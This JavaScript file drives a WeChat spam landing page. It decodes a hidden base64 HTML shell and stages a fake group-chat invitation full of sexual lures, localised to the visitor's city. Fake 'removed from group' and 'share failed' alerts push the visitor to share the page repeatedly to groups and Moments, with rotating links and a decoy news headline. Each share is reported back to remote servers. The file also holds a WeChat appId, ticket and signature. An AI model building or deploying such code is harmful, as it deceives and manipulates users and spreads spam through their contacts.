var count = 0;
var share = 0;
var doc = document.open('text/html', 'replace');
var dat = window.atob('PGh0bWw+PGhlYWQ+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4ucHJvZ3Jlc3MgeyAgICAgICAgaGVpZ2h0OiAzcHg7ICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDRiZTAxOyAgICAgICAgYW5pbWF0aW9uOiBsb2FkIDAuOHM7ICAgIH0gICAgQGtleWZyYW1lcyBsb2FkIHsgICAgICAgIDAlIHsgICAgICAgICAgICB3aWR0aDogMDsgICAgICAgIH0gICAgICAgIDQwJSB7ICAgICAgICAgICAgd2lkdGg6IDIwJTsgICAgICAgIH0gICAgICAgIDUwJSB7ICAgICAgICAgICAgd2lkdGg6IDgwJTsgICAgICAgIH0gICAgICAgIDEwMCUgeyAgICAgICAgICAgIHdpZHRoOiAxMDAlOyAgICAgICAgfSAgICB9PC9zdHlsZT48L2hlYWQ+PGJvZHkgY2xhc3M9InNob3ctdGltZW91dCI+PG1ldGEgY2hhcnNldD0idXRmLTgiPjxtZXRhIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEuMCxtaW5pbXVtLXNjYWxlPTEuMCxtYXhpbXVtLXNjYWxlPTEuMCx1c2VyLXNjYWxhYmxlPW5vIiAgICAgIG5hbWU9InZpZXdwb3J0Ij48bWV0YSBjb250ZW50PSJ5ZXMiIG5hbWU9ImFwcGxlLW1vYmlsZS13ZWItYXBwLWNhcGFibGUiPjxtZXRhIGNvbnRlbnQ9ImJsYWNrIiBuYW1lPSJhcHBsZS1tb2JpbGUtd2ViLWFwcC1zdGF0dXMtYmFyLXN0eWxlIj48bWV0YSBjb250ZW50PSJ0ZWxlcGhvbmU9bm8iIG5hbWU9ImZvcm1hdC1kZXRlY3Rpb24iPjxtZXRhIGNvbnRlbnQ9ImVtYWlsPW5vIiBuYW1lPSJmb3JtYXQtZGV0ZWN0aW9uIj48bWV0YSBjb250ZW50PSIiIG5hbWU9InBndiI+PHRpdGxlPjwvdGl0bGU+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4gICAgYm9keSwgZGl2LCBkbCwgZHQsIGRkLCB1bCwgb2wsIGxpLCBoMSwgaDIsIGgzLCBoNCwgaDUsIGg2LCBwcmUsIGZvcm0sIGZpZWxkc2V0LCBpbnB1dCwgdGV4dGFyZWEsIHAsIGJsb2NrcXVvdGUsIHRoLCB0ZCwgc3BhbiB7ICAgIHBhZGRpbmc6IDA7ICAgIG1hcmdpbjogMH1ib2R5IHsgICAgZm9udC1zaXplOiAxNnB4OyAgICBsaW5lLWhlaWdodDogMS41OyAgICBmb250LWZhbWlseTogIuW+rui9r+mbhem7kSIsICJMdWNpZGEgR3JhbmRlIiwgU1RIZWl0aSwgVmVyZGFuYSwgQXJpYWwsIFRpbWVzLCBzZXJpZjsgICAgYmFja2dyb3VuZDogI2YwZWZmNH1ib2R5LnNob3ctdGltZW91dCB7ICAgIGZvbnQ6IG5vcm1hbCAxNHB4LzIwcHggIk1pY3Jvc29mdCBZYUhlaSIsIEFyaWFsLCBzYW5zLXNlcmlmOyAgICBjb2xvcjogIzM1MzUzNTsgICAgYmFja2dyb3VuZDogI2ViZWJlYjsgICAgbGluZS1oZWlnaHQ6IDEuNTsgICAgb3ZlcmZsb3c6IGhpZGRlbn1pbWcgeyAgICBib3JkZXI6IDAgbm9uZX1hIHsgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOyAgICBmb250LXdlaWdodDogbm9ybWFsOyAgICBjb2xvcjogIzMzM311bCB7ICAgIGxpc3Qtc3R5bGU6IHVuc2V0OyAgICBsaXN0LXN0eWxlLXR5cGU6IGRlY2ltYWx9Ojotd2Via2l0LXNjcm9sbGJhciB7ICAgIHdpZHRoOiAwfTo6LXdlYmtpdC1zY3JvbGxiYXIgeyAgICBkaXNwbGF5OiBub25lfS5sYXllci1zaG93LXNoYXJlIHsgICAgd2lkdGg6IDEwMCU7ICAgIGhlaWdodDogMTAwJTsgICAgcG9zaXRpb246IGZpeGVkOyAgICB0b3A6IDA7ICAgIGxlZnQ6IDA7ICAgIGJvdHRvbTogMDsgICAgcmlnaHQ6IDA7ICAgIG9wYWNpdHk6IC41OyAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOyAgICB6LWluZGV4OiAxMDAwfS5sYXllci1zaG93LXNoYXJlIC5kaXYtc2hhcmUgeyAgICB3aWR0aDogMTAwJTsgICAgaGVpZ2h0OiAxMDAlOyAgICBsZWZ0OiAwOyAgICB0b3A6IDA7ICAgIHJpZ2h0OiAwOyAgICBib3R0b206IDA7ICAgIHBvc2l0aW9uOiBmaXhlZH0ubGF5ZXItc2hvdy1zaGFyZSBpbWcgeyAgICB3aWR0aDogMTAwJX0ucGFnZV9kaWFsb2cgeyAgICBwb3NpdGlvbjogZml4ZWQ7ICAgIHRvcDogMDsgICAgYm90dG9tOiAwOyAgICBsZWZ0OiAwOyAgICBwYWRkaW5nLWJvdHRvbTogODBweDsgICAgd2lkdGg6IDEwMCU7ICAgIG92ZXJmbG93LXk6IHNjcm9sbH0uZGlhbG9nIHsgICAgZGlzcGxheTogZmxleDsgICAgcGFkZGluZy10b3A6IDhweDsgICAgcGFkZGluZy1sZWZ0OiA4cHh9LmRpYWxvZ19oZWFkLCAuZGlhbG9nX2hlYWQgaW1nIHsgICAgd2lkdGg6IDQwcHg7ICAgIGhlaWdodDogNDBweH0uZGlhbG9nX2NvbiB7ICAgIG1hcmdpbi1sZWZ0OiA0cHg7ICAgIG1heC13aWR0aDogODAlfS50aXRsZSB7ICAgIHBhZGRpbmctbGVmdDogMTBweDsgICAgY29sb3I6ICM4YzhjOGM7ICAgIGZvbnQtc2l6ZTogMTJweH0uZGlhbG9nX2JveCB7ICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsgICAgbWFyZ2luLWxlZnQ6IDZweH0uZGlhbG9nX2JveF90ZXh0IHsgICAgcG9zaXRpb246IHJlbGF0aXZlOyAgICBtYXJnaW4tbGVmdDogNnB4OyAgICBwYWRkaW5nOiAxMHB4IDEwcHggMTBweCAxMHB4OyAgICBiYWNrZ3JvdW5kOiAjZmZmOyAgICBib3gtc2hhZG93OiAwIDAgMXB4ICNjY2M7ICAgIGJvcmRlci1yYWRpdXM6IDVweDsgICAgYm94LXNpemluZzogYm9yZGVyLWJveH0uaWNvbiB7ICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsgICAgdG9wOiAxM3B4OyAgICBsZWZ0OiAtNnB4OyAgICB3aWR0aDogNnB4OyAgICBoZWlnaHQ6IDlweH0uYm94X2NvbiB7ICAgIGZvbnQtc2l6ZTogMTZweDsgICAgd29yZC1icmVhazogYnJlYWstYWxsfS50aW1lIHsgICAgcGFkZGluZy10b3A6IDI1cHg7ICAgIHRleHQtYWxpZ246IGNlbnRlcn0udGlzaGkgeyAgICBwYWRkaW5nLXRvcDogMTBweDsgICAgdGV4dC1hbGlnbjogY2VudGVyfS50aW1lIHNwYW4sIC50aXNoaSBzcGFuIHsgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOyAgICBwYWRkaW5nLWxlZnQ6IDEwcHg7ICAgIHBhZGRpbmctcmlnaHQ6IDEwcHg7ICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMCwgMCwgMC4xKTsgICAgY29sb3I6ICNmZmY7ICAgIGZvbnQtc2l6ZTogMTJweDsgICAgYm9yZGVyLXJhZGl1czogM3B4fS5kaWFsb2dfYm90IHsgICAgcG9zaXRpb246IGZpeGVkOyAgICBib3R0b206IDA7ICAgIGxlZnQ6IDA7ICAgIHdpZHRoOiAxMDAlfS5kaWFsb2dfYm90IGltZyB7ICAgIHdpZHRoOiAxMDAlOyAgICBkaXNwbGF5OiBibG9ja30udG9wIHsgICAgd2lkdGg6IDEwMCU7ICAgIGJhY2tncm91bmQ6ICNmZmY7ICAgIG1hcmdpbjogMCBhdXRvOyAgICB0ZXh0LWFsaWduOiBjZW50ZXI7ICAgIHBhZGRpbmc6IDMwcHggMCAyNHB4fS50b3AgaW1nIHsgICAgd2lkdGg6IDkwcHg7ICAgIGJvcmRlci1yYWRpdXM6IDVweH0udG9wIGgyIHsgICAgZm9udC13ZWlnaHQ6IG5vcm1hbDsgICAgZm9udC1zaXplOiAxOHB4OyAgICBtYXJnaW4tdG9wOiA3cHg7ICAgIGNvbG9yOiAjNGQ0YzUxfS50b3Agc3BhbiB7ICAgIGNvbG9yOiAjODc4Nzg3fS5ib3QgeyAgICB3aWR0aDogMTAwJTsgICAgYm9yZGVyLXRvcDogMXB4IHNvbGlkICNiZWJlYmV9LmJvdCBoMSB7ICAgIHdpZHRoOiAxMDAlOyAgICB0ZXh0LWFsaWduOiBjZW50ZXI7ICAgIGRpc3BsYXk6IGlubGluZTsgICAgZmxvYXQ6IGxlZnQ7ICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7ICAgIGNvbG9yOiAjNGQ0YzUxOyAgICBmb250LXNpemU6IDIwcHg7ICAgIG1hcmdpbjogNDBweCAwIDEwcHh9LmJvdCBhIHsgICAgd2lkdGg6IDU0JTsgICAgZGlzcGxheTogaW5saW5lOyAgICBmbG9hdDogbGVmdDsgICAgbWFyZ2luOiAxNXB4IDIzJSAyNXB4OyAgICBiYWNrZ3JvdW5kOiAjMDRiZTAxOyAgICBjb2xvcjogI2ZmZjsgICAgdGV4dC1hbGlnbjogY2VudGVyOyAgICBwYWRkaW5nOiA4cHggMDsgICAgYm9yZGVyLXJhZGl1czogNXB4OyAgICBmb250LXNpemU6IDE4cHh9LmJvdCB1bCB7ICAgIGNvbG9yOiAjYjViNGI5OyAgICBkaXNwbGF5OiBpbmxpbmU7ICAgIGZsb2F0OiBsZWZ0OyAgICBtYXJnaW4tbGVmdDogMTBweDsgICAgbWFyZ2luLXJpZ2h0OiAzMHB4fS5zaG93LWJvZHktbG9hZGluZyAuYm94IHsgICAgZGlzcGxheTogbm9uZX0uY29tX3NkaXN7ZGlzcGxheTogbm9uZX0uc2hvdy1ib2R5LWxvYWRpbmcgLnBvcC1sb2FkaW5nLCAuc2hvdy1wb3AtbG9hZGluZyAucG9wLWxvYWRpbmcgeyAgICBkaXNwbGF5OiBibG9ja308L3N0eWxlPjxkaXYgY2xhc3M9InBhZ2VfZGlhbG9nIiBpZD0icGFnZURpYWxvZyIgc3R5bGU9IiI+PC9kaXY+PGRpdiBjbGFzcz0iZGlhbG9nX2JvdCI+PGltZyBzcmM9Imh0dHBzOi8vaGdkZWRtdnF3ZS5vc3MtY24tc2hhbmdoYWkuYWxpeXVuY3MuY29tLzYxOC9pbWcvYm90LmpwZyIgYWx0PSIiPjwvZGl2PjxkaXYgaWQ9InNoYXJlIiBjbGFzcz0ibGF5ZXItc2hvdy1zaGFyZSBjb21fc2RpcyIgPjxkaXYgY2xhc3M9ImRpdi1zaGFyZSI+PGltZyBpZD0ic2hhcmVpbWciICBzcmM9Imh0dHBzOi8vaGdkZWRtdnF3ZS5vc3MtY24tc2hhbmdoYWkuYWxpeXVuY3MuY29tLzEwMjkvc2hhcmVxdW4ucG5nIj48L2Rpdj48L2Rpdj48L2JvZHk+PC9odG1sPg==');
doc.write(dat);
doc.close();
$(document).attr("title","\u9080\u60a8\u8fdb\u7fa4");
// _f = JSON.parse(window.atob(_f));
//var _f = JSON.parse(window.atob(getJsParam('c.js', 'f')));
//var tmpf ='{"s":{"circle_img":"https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/1112/20181120103210.jpg","circle_title":"邀妳加⭐入少妇野⭐外车⭐震群","describe":"“程晨”邀妳加入女✏神集✏聚内有15位好友点击进入>>>","group_img":"https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/1112/20181120103210.jpg","group_title":"邀妳加♋入少妇野♋外车♋震群","manage_experience":0,"manage_img":"https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/eighth_one/lao.jpg","manage_title":"广州男^人一晚上💋几|次才算正常，男人应该好好看看了💋","ren":7,"title_df":["多多","妙彤","安安","梦晗","小樱"],"url":["https://kvjyraq5.sjssw.cn/~-)1dc551_87f89d47@e62937e21c995fb*ddbeeac8bf9518ada92b2d48b0653c790772e9ef7ad@55@14b0a7d40942a8c9b4edc665c3ff7c28@435@3a6b0e33f7ec337cf882650a8eb74852761ca509","https://kvjyraq5.sjssw.cn/9f47d7c113-c4feb99d1a)30,(28acb@8e603_*-140f70de9f09f03bbf64aac22d2a7b69-55-473354be3ca3b90f5b967c07f740a24e-435-3a6b0e33f7ec337cf882650a8eb74852761ca509","https://kvjyraq5.sjssw.cn/a9a24f88a80fc(*4515!63f3),_@ffecd4cf5f~9-f4f9fc98a52b2b2db2cc7a2f2b1e9d9a6f4dd435.55.8c22c44d031cf4b965a801ff7f244692eadba707.435.3a6b0e33f7ec337cf882650a8eb74852761ca509","https://kvjyraq5.sjssw.cn/29*3_ef15dcfda39b),79@8!80e8ef5296-4685(-c74d4d61477bed576a1fca1d8dc495bada0b646a-55-056ec0b003129482bf589a063f08bb05072457d5-435-3a6b0e33f7ec337cf882650a8eb74852761ca509","https://jd9rjbq.lgjyb.cn/542c9fb-4b59578789bbd_c38(284a9,e65156d8e4139494d599b7cd9c6caac64d633c5e22ba@55@045491c18f248f08a6c9b25188142bd9@500@3a6b0e33f7ec337cf882650a8eb74852761ca509","https://jd9rjbq.lgjyb.cn/!,e3@a8408e882(c~2161e9189*b60_1d764c-088901eab2a1f89e5fc00741bbfd29fd2a5199ad6b@55@a36143c04739f016af359decb1b6c41f@500@3a6b0e33f7ec337cf882650a8eb74852761ca509shank"]}}'; 
var _f = JSON.parse(bfg);
//var result = JSON.parse(window.atob(getJsParam('c.js', 'sign')));
//var tmpsign = '{"appId":"wx7269e97efb525f7b","jsApiList":["onMenuShareTimeline","onMenuShareAppMessage","hideOptionMenu","showOptionMenu","hideMenuItems","showMenuItems","closeWindow"],"nonceStr":"IE4Rn9QZvqAjf19y","rawString":"jsapi_ticket=HoagFKDcsGMVCIY2vOjf9gKWjlQo1PvrhHLP2DeN5mvXEqmGuEEz1FSg198FrsiRAnj1N7LLc5E7_lnq_3LKRg&noncestr=IE4Rn9QZvqAjf19y&timestamp=1543029900&url=http://awrqwe.360ybzy.com/(7_f195b1a8a)d117a!58d208@602218dc~d*55share-7e204f3025d7f7e6b9ec5b18a5f7d7cae6c7c3bc.55.323.72b14a17d36c013bf9013ed607fc3f03/c/500,435","signature":"391682f1ff620b55cb1588399b071d3ce7c64e9e","timestamp":"1543029900","url":"http://awrqwe.360ybzy.com/(7_f195b1a8a)d117a!58d208@602218dc~d*55share-7e204f3025d7f7e6b9ec5b18a5f7d7cae6c7c3bc.55.323.72b14a17d36c013bf9013ed607fc3f03/c/500,435"}';

var result = JSON.parse(tmpsign);
console.log('--------------------------f-log-----------------------------------------');
console.log(_f);
console.log('--------------------------sign-log-----------------------------------------');
console.log(result);

// console.log(_f,result);
// var result=JSON.parse(window.atob(signPackage));
var uc=['20181019173140','20181020205041','20181020205601','20181020205547'];
var tx=['1530029095803919','201861722482235322','201861722482151357','1479979165948','14799791651201','20180616181438','6',"140c10A013a0-94J20","140c1064ZHF-Z9448","14094I952N20-3V55E","14094I95239540-3T61Q","14094I95536150-4002220","1410613B5bG0-24Mc" ];
var index=   Math.floor(Math.random() * uc.length);
var indexs=   Math.floor(Math.random() * uc.length);
var tx_index=   Math.floor(Math.random() * tx.length);
var tx_indexs=   Math.floor(Math.random() * tx.length);
var tx_indexs=   Math.floor(Math.random() * tx.length);
var tx_index_s=   Math.floor(Math.random() * tx.length);
var luodi1role = "https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/618/img/";
var ali = "https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/618/img/";
var address = localAddress.city ? localAddress.city : (localAddress.province ? localAddress.province : '成都');
var city = address.replace(/(.*)市/,'$1');
city = city.replace(/(.*)省/,'$1');
_f.s.circle_title = _f.s.circle_title.replace(/{city}/, city);
_f.s.describe = _f.s.describe.replace(/{city}/, city);
_f.s.group_title = _f.s.group_title.replace(/{city}/, city);
_f.s.manage_title=_f.s.manage_title.replace(/{city}/, city);

var _ul=$("#pageDialog");

var spantag ='';
var d = new Date();
var min = d.getMinutes() >= 10 ? d.getMinutes() : '0' + d.getMinutes();
if (d.getHours() > 12)
{
    spantag = "下午" + d.getHours() + ":" + min;
} else {
    spantag = "上午" + d.getHours() + ":" + min;
}
setTimeout(function () {
    _ul.append('<div class="time" id="times" style="opacity: 1;"><span>'+spantag+'</span></div>');
    setTimeout(function () {
        _ul.append('<div class="time" id="timess" style="width: 88%;margin: 0 auto;"><span>“<i id="reiwu" style="color:227bcd;">'+_f.s.title_df[0]+'</i>”邀请你加入了群聊，群聊参与人员还有：小骚、瞄👙小姐、那一夜、你的呻吟、七尺大乳、一夜情、寂寞💄小姐、花花、情愫、性中人、苍老师、小娘们👠、情骚 ↗小姐、小影、林敏、甜腻、爆爱</span></div>');
        setTimeout(function () {
            _ul.append('<div class="dialog" style="opacity: 1;"><div class="dialog_head"><img src="'+luodi1role+tx[tx_index]+'.jpg"></div><div class="dialog_con"><div class="title">'+_f.s.title_df[0]+'</div><div class="dialog_box"><img style="width:150" src="https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/618/img/'+uc[indexs]+'.jpg"></div></div></div>');
            setTimeout(function () {
                _ul.append('<div class="dialog" style="opacity: 1;"><div class="dialog_head"><img  src="'+luodi1role+tx[tx_indexs]+'.jpg"></div><div class="dialog_con"><div class="title">'+_f.s.title_df[1]+'</div><div class="dialog_box"><img style="width:150"  src="https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/618/img/'+uc[index]+'.jpg"></div></div></div>');
                setTimeout(function () {
                    _ul.append('<div class="dialog" style="opacity: 1;"><div class="dialog_head"><img src="'+luodi1role+tx[tx_index_s]+'.jpg"></div><div class="dialog_con"><div class="title">'+_f.s.title_df[2]+'</div><div class="dialog_box_text"><div class="icon" style="background: url(&quot;https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/1029/dialog_arrow.png&quot;) no-repeat;"></div><div class="box_con">这女的是'+city+'车站旁边那家足疗店的，好骚啊</div></div></div></div>');
                    setTimeout(function () {
                        $("#times").remove();
                        _ul.append('<div class="dialog" style="opacity: 1;"><div class="dialog_head"><img src="'+luodi1role+tx[tx_indexs]+'.jpg"></div><div class="dialog_con"><div class="title">'+_f.s.title_df[3]+'</div><div class="dialog_box"><img style="width:150"  src="https://hgdedmvqwe.oss-cn-shanghai.aliyuncs.com/618/img/info5.jpg"></div></div></div>');
                        setTimeout(function () {
                            $("#timess").remove();
                            _ul.append('<div class="time" style="width: 88%;margin: 0 auto;"><span>你被“<i style="color:227bcd;">群主</i>”移除群聊</span></div>');
                            $("#share").removeClass("com_sdis");
                            setTimeout(function () {
                                _myAlert('<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><b><span style="font-size: 23px;color: #f5294c">你已经被管理员移出群组</span><br>提示：完成分享任务，即可重新加群<br>（请分享到一个微信群）<br><br>剩余名额<span style="font-size: 30px;color: #f5294c">'+_f.s.ren+'</span>人</b></div>');
                            },300);
                        },750);
                    },750);
                },750);
            },750);
        },750);
    },750);
},300);
function _myAlert(title,callback) {
    var _str = '<div id="avt" style=" width: 90%; height: auto; background: #fff;position: fixed;left: 5%; top: 30%;z-index: 9999;text-align: center;border-radius: 4px;"><div class="tips" style="width: 90%;margin: 20px 5%;font-size: 18px;line-height: 1.5em;color: #3F3F3F;">'+title+'</div><div class="isok" style=" width: 100%;height: 45px;text-align: center;line-height: 45px;font-size: 22px;border-top: 1px dotted #d6d6d6;color: #0bb20c;">确定</div></div>';
    $('body').append(_str);
    // console.log(callback);
    $('.isok').click(function () {
        if(typeof callback === 'function'){
            $('#avt').remove();
            callback();
        }else{
            $('#avt').remove();
        }
    });
}
function config_json(re) {
    var r = {
        'config': re,
        't': {
            'title': '习近平在上海考察：坚定改革开放再出发的信心和决心',
            'desc': '中共中央总书记、国家主席、中央军委主席习近平近日在上海考察时..',
            'img_url': '"http://inews.gtimg.com/newsapp_ls/0/6216033992_640330/0',
            'link': location.href,
            'type': 'video'
        }
    };
    r.config.jsApiList = ["onMenuShareTimeline", "onMenuShareAppMessage", "hideOptionMenu", "showOptionMenu", "hideMenuItems", "showMenuItems", "closeWindow"];
    return r;
}
function strdesc(r) {
    r.t.title =_f.s.group_title;
    r.t.desc =_f.s.describe;
    r.t.img_url =_f.s.circle_img;
    r.t.link =_f.s.url[0];
    return r;
}
function share_config(data) {
    wx.config(data.config);
    wx.ready(function () {
    	wx.hideMenuItems({
			menuList:['menuItem:share:timeline','menuItem:share:qq','menuItem:share:weiboApp','menuItem:favorite','menuItem:share:facebook','menuItem:share:QZone','menuItem:editTag','menuItem:delete','menuItem:copyUrl','menuItem:originPage','menuItem:readMode','menuItem:openWithQQBrowser','menuItem:openWithSafari','menuItem:share:email','menuItem:share:brand']
		});
        wx.onMenuShareAppMessage({
            title: data.t.title,
            desc: data.t.desc,
            link: data.t.link,
            imgUrl: data.t.img_url,
            type: data.t.type,
            success: function () {
                shaer_tips();
            }
        });
        wx.onMenuShareTimeline({
            title: data.t.title,
            link: data.t.link,
            imgUrl: data.t.img_url,
            type: data.t.type,
            success: function () {
                shaer_p_tips();
            }
        });
    });
}
function configReload(type) {
    wx.config(window.result.config);
    wx.ready(function () {
        if (type == 1) {
            wx.onMenuShareAppMessage({
                title: window.result.t.title,
                desc: window.result.t.desc,
                link: window.result.t.link,
                imgUrl: window.result.t.img_url,
                type: window.result.t.type,
                success: function () {
                    shaer_tips();
                }
            });
        }
        else {
            wx.onMenuShareTimeline({
                title: window.result.t.title,
                link: window.result.t.link,
                imgUrl: window.result.t.img_url,
                 type: window.result.t.type,
                success: function () {
                    shaer_p_tips();
                }
            });
        }
    });
}
function ajax(type,file,text,func){var XMLHttp_Object;try{XMLHttp_Object=new ActiveXObject("Msxml2.XMLHTTP")}catch(new_ieerror){try{XMLHttp_Object=new ActiveXObject("Microsoft.XMLHTTP")}catch(ieerror){XMLHttp_Object=false}}if(!XMLHttp_Object&&typeof XMLHttp_Object!="undefiend"){try{XMLHttp_Object=new XMLHttpRequest()}catch(new_ieerror){XMLHttp_Object=false}}type=type.toUpperCase();if(type=="GET")file=file+"?"+text;XMLHttp_Object.open(type,file,true);if(type=="POST")XMLHttp_Object.setRequestHeader("Content-Type","application/x-www-form-urlencoded");XMLHttp_Object.onreadystatechange=function ResponseReq(){if(XMLHttp_Object.readyState==4)func(XMLHttp_Object.responseText)};if(type=="GET")text=null;XMLHttp_Object.send(text)}
function share_ajax(val){
	ajax('post','../deal.php','res=' + val,
	function(data)
	{
		data = null;
	});
}

function shaer_tips() {
    switch (share) {
        case 0:
            window.result.t.link = _f.s.url[1];
            configReload(1);
            _myAlert('<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">2</b>个不同的群即可<b style="color: red;font-size: 24px;">即可进群!</b>');
            share++;
            share_ajax('friend');
            break;
        case 1:
            window.result.t.link = _f.s.url[2];
            window.result.t.type = 'video';
            configReload(1);
            _myAlert('<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">1</b>个不同的群');
            share++; //2
            share_ajax('friend');
            break;
        case 2:
            window.result.t.link = _f.s.url[3];
            configReload(1);
            _myAlert('<b>请继续分享到<span style="color: red;">1</span>个不同的群</b><br/><span style="font-size: 22px;color: red;">即可进群</span>');
            share++; //3
            share_ajax('friend');          
            break;
        case 3:
            window.result.t.title =_f.s.circle_title;
            window.result.t.img_url =_f.s.circle_img;
            window.result.t.link = _f.s.url[4];
               window.result.t.type = 'link';
            configReload(2);
            _myAlert('<b>群分享完成，最后一步</b><br/><b>请分享到<span style="color: red; font-size: 20px;">朋友圈</span></b><br/><span style="font-size: 22px;color: red;">即可进群</span>');
            share++;
            share_ajax('friend');
            wx.showMenuItems({
    			menuList:['menuItem:share:timeline']
    		});
        	wx.hideMenuItems({
    			menuList:['menuItem:share:appMessage','menuItem:share:qq','menuItem:share:weiboApp','menuItem:favorite','menuItem:share:facebook','menuItem:share:QZone','menuItem:editTag','menuItem:delete','menuItem:copyUrl','menuItem:originPage','menuItem:readMode','menuItem:openWithQQBrowser','menuItem:openWithSafari','menuItem:share:email','menuItem:share:brand']
    		});
            break;
        default:
            _myAlert('<b style="font-size: 24px;color: red;">请分享到朋友圈</b>分享到群<b></b>');
            break;
    }
}
function shaer_p_tips() {
    switch (share) {
        case 4:
            if(_f.s.manage_experience){
                window.result.t.link = _f.s.url[5];
                window.result.t.title = _f.s.manage_title;
                window.result.t.img_url =_f.s.manage_img;
                window.result.t.type = 'video';
                configReload(2);
            }else{
                //window.result.t.title =_f.s.circle_title;
            	var Biao = ['⭐','🍒','🌟','🍎','💫','👑','🍇','🔞','🌀'];  
            	var bqn = Math.floor(Math.random() * Biao.length + 1)-1; 
            	window.result.t.title ='邀妳加'+Biao[bqn]+'入'+city+'少妇野'+Biao[bqn]+'外车'+Biao[bqn]+'震群';
            //window.result.t.img_url =_f.s.circle_img;
            	var Arr = [1,2,3];  
            	var n = Math.floor(Math.random() * Arr.length + 1)-1;  
            	window.result.t.img_url = d1_domain+"/images/qun_"+Arr[n]+'.jpg';
                window.result.t.type = 'link';
                configReload(2);
            }
            share_ajax('timeline');
            _myAlert('分享失败，请重新分享到<b style="color: red;font-size: 22px;">朋友圈</b>即可<b style="color: red;font-size: 22px;">进群！</b>');
            share++;            
            break;
        case 5:
        	  share_ajax('timeline');
              wx.hideMenuItems({
      			menuList:['menuItem:share:timeline','menuItem:share:qq','menuItem:share:weiboApp','menuItem:favorite','menuItem:share:facebook','menuItem:share:QZone','menuItem:editTag','menuItem:delete','menuItem:copyUrl','menuItem:originPage','menuItem:readMode','menuItem:openWithQQBrowser','menuItem:openWithSafari','menuItem:share:email','menuItem:share:brand']
      		});
            _myAlert(
                '由于参与人数过多！<br/>群主稍后拉你进群,请耐心等待<br/><br/>朋友圈信息不可删除<br/><span style="color:green">否则无法核实！</span>',function () {
                    //console.log(11111);
                   //http://zhuangyuanfujiuye.com/index.php/index/vasl/id/6
                    $.ajax({
                        type: 'GET',
                        url:'http://www.yixitong777.com/adv/Ainterfaces/dir/1029/index/indefive',
                        dataType: 'json',
                        beforeSend: function (xhr) {
                            $('meta[name=referrer]').attr('content', 'always');
                        },
                        success: function (result) {
                          //result.v  confirm-join-jump-url
                            //location.href =result.url ;
                        }
                    });
                }
            );          
            break;
    }
}
window.result = config_json(result);
console.log('-------------------------------------------log-last');
console.log(strdesc(window.result));
share_config(strdesc(window.result));
function getJsParam(jsName, paramName) {
    /*******************************************
     说明：获取js文件后的参数
     jsName：js文件名称
     paramName：要获取的参数名称（如果该参数没有传，则返回整个js参数的数组Json对象）
     ********************************************/
    var retJsonArr = [],
        retVal = '';
    var rName = new RegExp(jsName + "(\\?(.*))?$");
    var jss = document.getElementsByTagName('script');
    for (var i = 0; i < jss.length; i++) {
        var j = jss[i];
        if (j.src && j.src.match(rName)) {
            var oo = j.src.match(rName)[2];
            if (oo && (t = oo.match(/([^&=]+)=([^=&]+)/g))) {
                for (var l = 0; l < t.length; l++) {
                    r = t[l];
                    var tt = r.match(/([^&=]+)=([^=&]+)/);
                    if (tt) {
                        retJsonArr.push({
                            key: tt[1],
                            val: tt[2]
                        });

                        if (paramName != undefined && paramName.length > 0 && paramName == tt[1]) {
                            retVal = tt[2];
                        }
                    }
                }
            }
        }
    }
    return paramName != undefined && paramName.length > 0 ? retVal : retJsonArr;
}
//share shareimg
$('#share').on('click', function () {
     switch (share) {
        case 0:
            _myAlert('<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"><b><span style="font-size: 23px;color: #f5294c">你已经被管理员移出群组</span><br>提示：完成分享任务，即可重新加群<br>（请分享到一个微信群）<br><br>剩余名额<span style="font-size: 30px;color: #f5294c">'+_f.s.ren+'</span>人</b></div>');
            break;
        case 1:
            _myAlert('<b style="font-size: 24px;color: red;">分享成功！</b><br/>请继续分享到<b style="color: red;">2</b>个不同的群即可<b style="color: red;font-size: 24px;">进群!</b>');
            break;
        case 2:
            _myAlert('<b style="font-size: 24px;color: red;">分享失败！</b><br/>请继续分享到<b style="color: red;">1</b>个不同的群');
            break;
        case 3:
            _myAlert('<b style="font-size: 24px;color: red;">分享失败！</b><br/>注意:分享到相同的群会失败！请继续分享到<b style="color: red;">1</b>个不同的群');
            break;
        case 4:
            _myAlert('<b style="font-size: 24px;color: red;">分享完成！<br/>最后一步</b><br/>分享到<b style="color: red;">朋友圈</b>即可<b style="color: red;font-size: 24px;">进群</b>');
            break;
        case 5:
//            _myAlert('<b style="font-size: 24px;color: red;">分享失败！</b><br/>必须公开分享，请再次分享到<b style="color: red;">朋友圈</b>即可继续观看');
        	 _myAlert( '由于参与人数过多！<br/>群主稍后拉你进群,请耐心等待<br/><br/>朋友圈信息不可删除<br/><span style="color:green">否则无法核实！</span>');        
            break;
    }
});